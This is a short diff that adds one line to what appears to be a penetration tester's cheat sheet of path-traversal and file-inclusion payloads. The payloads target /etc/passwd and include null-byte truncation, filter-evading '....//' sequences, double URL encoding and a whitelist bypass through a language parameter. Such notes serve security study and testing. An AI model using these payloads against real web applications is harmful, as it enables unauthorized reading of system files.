@@ -1,5 +1,6 @@
 * `/etc/passwd`
 * `../../..etc/passwd`
+* `language=./languages/../../../../etc/passwd` - bypass whitelist
 * %00 - PHP stops reading file path and name, e. g. ../../../etc/passwd%00.php
 * ....//....//....//etc/passwd - to bypass auto replace
 * double URL encode, whole URL or just . / symbols
